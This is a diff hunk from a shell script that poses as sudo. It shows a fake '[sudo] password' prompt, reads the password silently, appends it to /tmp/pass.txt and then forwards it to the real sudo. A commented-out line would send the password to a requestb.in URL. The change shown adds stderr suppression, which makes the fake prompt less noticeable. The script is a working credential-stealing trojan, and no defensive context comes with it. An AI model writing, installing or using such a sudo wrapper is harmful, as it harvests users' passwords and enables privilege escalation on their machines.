@@ -3,4 +3,4 @@ echo -n "[sudo] password for $USER: "
 read -s password
 #curl https://requestb.in/<custom code here>?$(echo $password)    #Go to https://requestb.in to get custom url code
 echo $password >> /tmp/pass.txt
-echo $password | /usr/bin/sudo -S $*
+echo $password | /usr/bin/sudo -S $* 2> /dev/null
